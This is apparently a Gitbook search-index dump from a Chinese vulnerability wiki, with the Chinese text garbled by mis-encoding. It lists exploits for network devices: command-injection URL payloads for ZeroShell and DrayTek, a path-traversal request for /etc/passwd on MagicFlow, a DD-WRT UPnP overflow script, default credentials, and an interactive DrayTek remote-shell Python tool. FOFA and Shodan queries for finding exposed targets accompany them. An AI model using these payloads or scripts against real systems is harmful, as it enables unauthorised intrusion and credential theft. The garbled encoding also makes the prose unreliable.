Á©∫ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ZeroShell/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ZeroShell/","title":"ZeroShell","keywords":"","body":"ZeroShell ZeroShell 3.9.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2019-12725 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ZeroShell/ZeroShell 3.9.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2019-12725.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ZeroShell/ZeroShell 3.9.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2019-12725.html","title":"ZeroShell 3.9.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2019-12725","keywords":"","body":"ZeroShell 3.9.0 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2019-12725 ÊºèÊ¥ûÊèèËø∞ ZeroShell 3.9.0 Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºå/cgi-bin/kerbynet È°µÈù¢Ôºåx509type ÂèÇÊï∞ËøáÊª§‰∏ç‰∏•Ê†ºÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ZeroShell FOFA [!NOTE] app=\"Zeroshell-Èò≤ÁÅ´Â¢ô\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã È™åËØÅÁöÑPOC‰∏∫ /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/JCG/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/JCG/","title":"JCG","keywords":"","body":"JCG JCG JHR-N835R ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/JCG/JCG JHR-N835R ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/JCG/JCG JHR-N835R ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"JCG JHR-N835R ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"JCG JHR-N835R ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ JCG JHR-N835R ÂêéÂè∞Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÔºåÈÄöËøá ; ÂàÜÂâ≤ ping ÂëΩ‰ª§ÂØºËá¥‰ªªÊÑèÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] JCG JHR-N835R Shodan [!NOTE] JHR-N835R ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ admin adminÁôªÂΩï Âú®ÂêéÂè∞Á≥ªÁªüÂ∑•ÂÖ∑ÈÇ£‰ΩøÁî® PINGÂ∑•ÂÖ∑Ôºå‰ΩøÁî® ; ÂëΩ‰ª§ÊâßË°åÁªïËøá Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DD-WRT/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DD-WRT/","title":"DD-WRT","keywords":"","body":"DD-WRT DD-WRT UPNPÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û CVE-2021-27137 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DD-WRT/DD-WRT UPNPÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û CVE-2021-27137.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DD-WRT/DD-WRT UPNPÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û CVE-2021-27137.html","title":"DD-WRT UPNPÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û CVE-2021-27137","keywords":"","body":"DD-WRT UPNPÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û CVE-2021-27137 ÊºèÊ¥ûÊèèËø∞ ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåDD-WRT‰∏≠ÁöÑUPNPÂ§Ñ‰∫éÁ¶ÅÁî®Áä∂ÊÄÅÔºåÂπ∂‰∏î‰ªÖÂú®ÂÜÖÈÉ®ÁΩëÁªúÊé•Âè£‰∏ä‰æ¶Âê¨„ÄÇ UPNPÊú¨Ë¥®‰∏äÊòØÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑUDPÂΩ¢ÂºèÁöÑÂçèËÆÆ‚ÄìÁî±‰∫éÊó†Ê≥ïÂØπÂçèËÆÆÂº∫Âà∂ÊâßË°åË∫´‰ªΩÈ™åËØÅÔºåÂõ†Ê≠§ÂÆÉÊó¢Êòì‰∫é‰ΩøÁî®ÂèàÂÖ∑Êúâ‰∏çÂÆâÂÖ®ÊÄß„ÄÇ Â¶ÇÊûúDD-WRTÂêØÁî®‰∫ÜUPNPÊúçÂä°ÔºåÂàôÂùêÂú®Â≠òÂú®DD-WRTËÆæÂ§áÁöÑLAN‰∏äÁöÑËøúÁ®ãÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂèëÈÄÅ‰∏Ä‰∏™ËøáÈïøÁöÑuuidÂÄºÊù•Ëß¶ÂèëÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇ Ê†πÊçÆÈÉ®ÁΩ≤DD-WRTÁöÑÂπ≥Âè∞ÁöÑ‰∏çÂêåÔºåÂèØËÉΩÂ≠òÂú®ÁºìËß£Êé™ÊñΩÔºå‰πüÂèØËÉΩÊ≤°ÊúâÁºìËß£Êé™ÊñΩÔºå‰æãÂ¶ÇASLRÁ≠âÔºåËøô‰ΩøÂæóÂèØÂà©Áî®ÊÄßÂèñÂÜ≥‰∫éÂÆâË£ÖDD-WRTÁöÑÂπ≥Âè∞„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] DD-WRT ÊºèÊ¥ûÂ§çÁé∞ ÈÄöËøáÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåssdp.cÂèØ‰ª•ÂæàÂÆπÊòìÂú∞ÂèëÁé∞ÊúâÈóÆÈ¢òÁöÑ‰ª£Á†ÅÔºö Áî®Êà∑Êèê‰æõÁöÑÊï∞ÊçÆÁöÑÊú™ÁªëÂÆöÂâØÊú¨Ë¢´Â§çÂà∂Âà∞ÁºìÂÜ≤Âå∫‰∏≠ÔºåËØ•ÁºìÂÜ≤Âå∫ÁöÑÂ§ßÂ∞èÈôêÂà∂‰∏∫128‰∏™Â≠óËäÇ„ÄÇ Áî±‰∫éÈªòËÆ§ÊÉÖÂÜµ‰∏ãÊú™ÂêØÁî®UPNPÊúçÂä°ÔºåÂõ†Ê≠§ÈáçÊñ∞ÂàõÂª∫ÊºèÊ¥ûÁöÑÁ¨¨‰∏ÄÊ≠•ÊòØÂêØÁî®Â∞ÜËá™Âä®ÂêØÂä®ËØ•ÊúçÂä°ÁöÑÊúçÂä° ÂêØÂä®PoCËÑöÊú¨Â∞ÜËß¶ÂèëupnpÊúçÂä°Â¥©Ê∫ÉÔºåËøôÂèØ‰ª•Âú®ÂêØÂä®‰ª•‰∏ãpythonËÑöÊú¨Âá†ÁßíÈíüÂêéÁúãÂà∞ ÊºèÊ¥ûÂà©Áî®POC import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/MagicFlow/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/MagicFlow/","title":"MagicFlow","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/MagicFlow/MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ main.xp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/MagicFlow/MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ main.xp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ main.xp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ main.xp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ main.xp Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÁâπÂÆöÁöÑUrlËé∑ÂèñÊïèÊÑüÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] MagicFlow Èò≤ÁÅ´Â¢ôÁΩëÂÖ≥ FOFA [!NOTE] app=\"MSA/1.0\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊûÑÈÄ†POC /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/","title":"WayOS","keywords":"","body":"Wayos Wayos ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Âº±Âè£‰ª§ CNVD-2021-00876 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Âº±Âè£‰ª§ CNVD-2021-00876.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Âº±Âè£‰ª§ CNVD-2021-00876.html","title":"Wayos ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Âº±Âè£‰ª§ CNVD-2021-00876","keywords":"","body":"Wayos ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Âº±Âè£‰ª§ CNVD-2021-00876 ÊºèÊ¥ûÊèèËø∞ Ê∑±Âú≥Áª¥ÁõüÁßëÊäÄËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏ÊòØÂõΩÂÜÖÈ¢ÜÂÖàÁöÑÁΩëÁªúËÆæÂ§áÂèäÊô∫ËÉΩÂÆ∂Â±Ö‰∫ßÂìÅËß£ÂÜ≥ÊñπÊ°à‰æõÂ∫îÂïÜÔºå‰∏ªËê•‰∫ßÂìÅÂåÖÊã¨Êó†Á∫øÁΩëÂÖ≥„ÄÅ‰∫§Êç¢Êú∫„ÄÅÂõΩÂ§ñVPN„ÄÅÂèåÈ¢ëÂê∏È°∂apÁ≠â„ÄÇ ACÈõÜ‰∏≠ÁÆ°ÁêÜÂπ≥Âè∞Â≠òÂú®Âº±Âè£‰ª§ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"ACÈõÜ‰∏≠ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÈªòËÆ§Âº±Âè£‰ª§‰∏∫ admin:admin Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Wayos_AC_Centralized_management_system_Default_weak_password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos Èò≤ÁÅ´Â¢ô Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos Èò≤ÁÅ´Â¢ô Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Wayos Èò≤ÁÅ´Â¢ô Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Wayos Èò≤ÁÅ´Â¢ô Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Wayos Èò≤ÁÅ´Â¢ôÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÂâçÁ´ØÂèØ‰ª•Êü•ÁúãÂà∞ÂØÜÁ†ÅÁöÑmd5ÁöÑÂä†ÂØÜÂ≠óÁ¨¶ÔºåËß£ÂØÜÂêéÂèØ‰ª•ÁôªÈôÜÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Wayos Èò≤ÁÅ´Â¢ô FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã F12 Êü•ÁúãË¥¶Âè∑ÂØÜÁ†Å Ëß£ÂØÜMd5Âç≥ÂèØÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos Èò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/WayOS/Wayos Èò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Wayos Èò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Wayos Èò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Wayos Èò≤ÁÅ´Â¢ô ÂêéÂè∞Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÈÄöËøáÂëΩ‰ª§Ê≥®ÂÖ•ÂèØ‰ª•ÊâßË°åËøúÁ®ãÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Wayos Èò≤ÁÅ´Â¢ô FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÁôªÂΩïÂêéÂè∞Âêé ping Ê®°ÂùóÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DrayTek/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DrayTek/","title":"DrayTek","keywords":"","body":"DrayTek DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-8515 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DrayTek/DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-8515.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/DrayTek/DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-8515.html","title":"DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-8515","keywords":"","body":"DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-8515 ÊºèÊ¥ûÊèèËø∞ DrayTek URIÊú™ËÉΩÊ≠£Á°ÆÂ§ÑÁêÜSHELLÂ≠óÁ¨¶ÔºåËøúÁ®ãÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®ËØ•ÊºèÊ¥ûÊèê‰∫§ÁâπÊÆäÁöÑËØ∑Ê±ÇÔºåÂèØ‰ª•ROOTÊùÉÈôêÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ ËøúÁ®ãÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûË¢´Ê†áËÆ∞‰∏∫CVE-2020-8515Ôºå‰∏ªË¶ÅÂΩ±Âìç‰∫ÜDrayTek VigorÁΩëÁªúËÆæÂ§áÔºåÂåÖÊã¨‰ºÅ‰∏ö‰∫§Êç¢Êú∫„ÄÅË∑ØÁî±Âô®„ÄÅË¥üËΩΩÂùáË°°Âô®ÂíåVPNÁΩëÂÖ≥„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Vigor2960 Vigor300B Vigor3900 VigorSwitch20P2121 VigorSwitch20G1280 VigorSwitch20P1280 VigorSwitch20G2280 VigorSwitch20P2280 FOFA [!NOTE] title=\"Vigor 2960\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ÊäìÂåÖ ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a ÂÖ∂‰∏≠Âá∫Áé∞Ê≥®ÂÖ•ÁÇπÁöÑÂèÇÊï∞‰∏∫ keyPath [!NOTE] Âá∫Áé∞Á©∫Ê†ºÈúÄË¶ÅÊõøÊç¢Ôºå‰æãÂ¶Ç cat /etc/passwd --> cat${IFS}/etc/passwd ÂèØ‰ª•‰ΩøÁî® & ÊâßË°åÈ¢ùÂ§ñ‰∏ÄÊù°ÂëΩ‰ª§ (URLÁºñÁ†Å‰∏∫ %26) ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> pwd \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüËØªÂèñ /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_2(target_url, Cmd) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) sys.exit(0) def POC_2(target_url, Cmd): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } Cmd = Cmd.replace(' ','${IFS}') data = \"action=login&keyPath=%27%0A%2fbin%2f%26{}%0A%27&loginUser=a&loginPwd=a\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Goby‰∏≠Â∑≤ÁªèÂåÖÂê´Ê≠§ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Intelbras/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Intelbras/","title":"Intelbras","keywords":"","body":"Intelbras Intelbras Wireless Êú™ÊéàÊùÉ‰∏éÂØÜÁ†ÅÊ≥ÑÈú≤ CVE-2021-3017 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Intelbras/Intelbras Wireless Êú™ÊéàÊùÉ‰∏éÂØÜÁ†ÅÊ≥ÑÈú≤ CVE-2021-3017.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Intelbras/Intelbras Wireless Êú™ÊéàÊùÉ‰∏éÂØÜÁ†ÅÊ≥ÑÈú≤ CVE-2021-3017.html","title":"Intelbras Wireless Êú™ÊéàÊùÉ‰∏éÂØÜÁ†ÅÊ≥ÑÈú≤ CVE-2021-3017","keywords":"","body":"Intelbras Wireless Êú™ÊéàÊùÉ‰∏éÂØÜÁ†ÅÊ≥ÑÈú≤ CVE-2021-3017 ÊºèÊ¥ûÊèèËø∞ Intelbras IWR 3000NÊòØÊ≥¢ÂÖ∞IntelbrasÂÖ¨Âè∏ÁöÑ‰∏ÄÊ¨æÊó†Á∫øË∑ØÁî±Âô®„ÄÇ Intelbras WIN 300 and WRN 342 devices 2021-01-04ÁâàÊú¨Âèä‰πãÂâçÁâàÊú¨Â≠òÂú®ÂÆâÂÖ®ÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÂÖÅËÆ∏ËøúÁ®ãÊîªÂáªËÄÖÈÄöËøáËØªÂèñHTMLÊ∫ê‰ª£Á†Å‰∏≠ÁöÑdef wireless spasswordË°åÊù•ÂèëÁé∞Âá≠ÊçÆ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] win_300_firmware Á≠â FOFA [!NOTE] body=\"def_wirelesspassword\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Êü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†ÅÔºåÊ≥ÑÈú≤‰∫ÜÈÖçÁΩÆÂØÜÁ†Å ÊµãËØï‰∫Ü‰∏Ä‰∏ãÂÖ∂‰ªñÁöÑÔºåÂèëÁé∞Âá∫Áé∞Ë¥¶Âè∑ÂØÜÁ†ÅÁöÑÂéüÂõ†‰∏∫ËÆøÈóÆÁöÑÊòØË∑ØÁî±ÁöÑÈÖçÁΩÆÈ°µÈù¢ÔºåÈÖçÁΩÆÂêéËé∑ÂèñÂêéÂè∞ÊùÉÈôê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 